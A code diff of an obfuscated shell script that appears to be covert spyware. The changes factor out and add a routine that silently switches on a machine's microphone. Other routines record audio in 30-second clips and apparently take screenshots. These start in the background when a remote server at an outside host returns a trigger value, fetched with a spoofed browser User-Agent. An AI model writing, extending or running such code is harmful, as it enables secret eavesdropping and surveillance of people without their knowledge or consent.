@@ -33,14 +33,7 @@ function ax_(){
     duration=30
     output_file="a.wav"
     #
-    microphone_status=$(amixer get Capture | grep "\[on\]")
-    #
-	if [[ -n $microphone_status ]]; then
-	    dbgx "ax... Mcx...Okx..."
-	else
-	    amixer set Capture toggle
-	    amixer set Capture cap
-	fi
+    Mcx
     #
     #amixer set Capture cap
     #
@@ -131,6 +124,17 @@ function Ntx(){
     #
 }
 
+function Mcx(){
+	microphone_status=$(amixer get Capture | grep "\[on\]")
+ 	#
+	if [[ -n $microphone_status ]]; then
+	    dbgx "ax... Mcx...Okx..."
+	else
+	    amixer set Capture toggle
+	    amixer set Capture cap
+	fi
+}
+
 function px(){
     px_OX=`curl -k -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/px`
     if [[ "$px_OX" == "TRUE" ]]
@@ -139,9 +143,11 @@ function px(){
 	#
         Ntx
 	#
+ 	Mcx
+ 	#
     	ax_ & ssx_ & PxNwx
     	#
-	ssx2
+	#ssx2
  	#reboot
 	#
 	exit 0
@@ -157,13 +163,8 @@ function ssx2(){
 	while [ $et -le $st ]
 	do
 	 et=`date +%s`
-  	 #
-    	if [[ -n $microphone_status ]]; then
-	    dbgx "ax... Mcx...Okx..."
-	else
-	    amixer set Capture toggle
-	    amixer set Capture cap
-	fi
+  	#
+    	Mcx
  	#
   	 ssx_ & ax_
 	 sleep 30
